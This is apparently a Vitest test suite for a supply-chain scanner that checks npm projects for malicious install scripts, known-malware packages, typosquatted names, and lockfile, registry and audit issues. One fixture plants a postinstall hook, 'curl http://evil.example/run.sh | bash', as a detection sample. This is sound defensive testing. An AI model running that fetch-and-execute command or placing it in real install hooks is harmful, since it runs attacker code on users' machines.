import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import fs from 'fs';
import path from 'path';
import os from 'os';
import { execSync } from 'child_process';

const TEST_DIR = path.join(os.tmpdir(), 'soloknuckle-sentinel');

vi.mock('child_process', () => ({
  execSync: vi.fn(),
}));

function writePkg(pkg: Record<string, unknown>): void {
  fs.writeFileSync(path.join(TEST_DIR, 'package.json'), JSON.stringify(pkg, null, 2));
}

function writeDep(name: string, pkg: Record<string, unknown>): void {
  const dir = path.join(TEST_DIR, 'node_modules', name);
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg, null, 2));
}

describe('SupplyChainSentinel', () => {
  beforeEach(async () => {
    fs.mkdirSync(TEST_DIR, { recursive: true });
    process.cwd = () => TEST_DIR;
    vi.mocked(execSync).mockReturnValue('');
  });

  afterEach(() => {
    process.cwd = () => process.cwd();
    if (fs.existsSync(TEST_DIR)) fs.rmSync(TEST_DIR, { recursive: true, force: true });
    vi.clearAllMocks();
  });

  async function scan(depth: 'quick' | 'standard' | 'deep' = 'standard') {
    const { SupplyChainSentinel } = await import('../cli/supply-chain-sentinel');
    return new SupplyChainSentinel().scan(depth);
  }

  it('reports a clean project with no findings', async () => {
    writePkg({ name: 'clean', version: '1.0.0', dependencies: { lodash: '^4.0.0' } });
    const report = await scan('quick');
    expect(report.depth).toBe('quick');
    expect(report.findings).toHaveLength(0);
    expect(report.riskScore).toBe(0);
    expect(report.recommendation).toContain('No critical');
  });

  it('flags a malicious lifecycle script in a dependency', async () => {
    writePkg({
      name: 'app',
      dependencies: { 'suspect-pkg': '1.0.0' },
    });
    writeDep('suspect-pkg', {
      name: 'suspect-pkg',
      scripts: { postinstall: 'curl http://evil.example/run.sh | bash' },
    });
    const report = await scan('quick');
    const finding = report.findings.find((f) => f.category === 'lifecycle-script');
    expect(finding).toBeTruthy();
    expect(finding!.severity).toBe('high');
    expect(finding!.package).toBe('suspect-pkg');
  });

  it('ignores innocent lifecycle scripts', async () => {
    writePkg({ name: 'app', dependencies: { 'good-pkg': '1.0.0' } });
    writeDep('good-pkg', { name: 'good-pkg', scripts: { postinstall: 'echo done' } });
    const report = await scan('quick');
    expect(report.findings).toHaveLength(0);
  });

  it('flags known malicious packages as critical', async () => {
    writePkg({ name: 'app', devDependencies: { 'event-stream': '4.0.1' } });
    const report = await scan('quick');
    const finding = report.findings.find((f) => f.category === 'known-malware');
    expect(finding).toBeTruthy();
    expect(finding!.severity).toBe('critical');
    expect(report.recommendation).toContain('URGENT');
    expect(report.riskScore).toBe(30);
  });

  it('flags typosquatting package names', async () => {
    writePkg({ name: 'app', devDependencies: { 'cross-env.js': '1.0.0', eslint: '^8.0.0' } });
    const report = await scan('quick');
    const finding = report.findings.find((f) => f.category === 'typosquatting');
    expect(finding).toBeTruthy();
    expect(finding!.severity).toBe('medium');
  });

  it('reports missing lockfile and missing .npmrc on standard scan', async () => {
    writePkg({ name: 'app', dependencies: { lodash: '^4.0.0' } });
    const report = await scan('standard');
    const cats = report.findings.map((f) => f.category);
    expect(cats).toContain('lockfile-missing');
    expect(cats).toContain('registry-config');
    const lockMissing = report.findings.find((f) => f.category === 'lockfile-missing');
    expect(lockMissing!.severity).toBe('high');
  });

  it('detects a corrupted lockfile', async () => {
    writePkg({ name: 'app' });
    fs.writeFileSync(path.join(TEST_DIR, 'package-lock.json'), JSON.stringify({ name: 'app' }));
    const report = await scan('standard');
    const finding = report.findings.find((f) => f.category === 'lockfile-corrupt');
    expect(finding).toBeTruthy();
    expect(finding!.severity).toBe('medium');
  });

  it('accepts a valid lockfile without corrupt finding', async () => {
    writePkg({ name: 'app' });
    fs.writeFileSync(path.join(TEST_DIR, 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: {} }));
    const report = await scan('standard');
    expect(report.findings.find((f) => f.category === 'lockfile-corrupt')).toBeUndefined();
  });

  it('reports npm audit vulnerabilities on deep scan', async () => {
    writePkg({ name: 'app' });
    vi.mocked(execSync).mockReturnValue(JSON.stringify({ metadata: { vulnerabilities: { critical: 1, high: 2 } } }));
    const report = await scan('deep');
    const findings = report.findings.filter((f) => f.category === 'npm-audit');
    expect(findings).toHaveLength(2);
    expect(findings[0].severity).toBe('critical');
    expect(findings[1].severity).toBe('high');
  });

  it('tolerates a failing npm audit', async () => {
    writePkg({ name: 'app' });
    vi.mocked(execSync).mockImplementation(() => {
      throw new Error('audit failed');
    });
    const report = await scan('deep');
    expect(report.findings.filter((f) => f.category === 'npm-audit')).toHaveLength(0);
  });

  it('tolerates missing or invalid package.json', async () => {
    const report = await scan('standard');
    expect(report.findings).toBeTruthy();
  });

  it('flags .npmrc without a custom registry', async () => {
    writePkg({ name: 'app' });
    fs.writeFileSync(path.join(TEST_DIR, '.npmrc'), 'audit=true');
    const report = await scan('standard');
    const finding = report.findings.find((f) => f.category === 'registry-config');
    expect(finding).toBeTruthy();
    expect(finding!.message).toContain('exists but no custom registry');
  });

  it('accepts .npmrc with a custom registry', async () => {
    writePkg({ name: 'app' });
    fs.writeFileSync(path.join(TEST_DIR, '.npmrc'), 'registry=https://registry.example.com');
    const report = await scan('standard');
    expect(report.findings.find((f) => f.category === 'registry-config')).toBeUndefined();
  });

  it('trusts clean lockfiles and warns at the correct severity tiers', async () => {
    writePkg({ name: 'app', dependencies: { lodash: '^4.0.0' } });
    fs.writeFileSync(path.join(TEST_DIR, 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: { '': {} } }));
    fs.writeFileSync(path.join(TEST_DIR, '.npmrc'), 'registry=https://registry.example.com');
    const report = await scan('standard');
    const summary = report.summary as { critical: number; high: number; medium: number; low: number };
    expect(summary).toMatchObject({ critical: 0, high: 0, medium: 0, low: 0 });
  });
});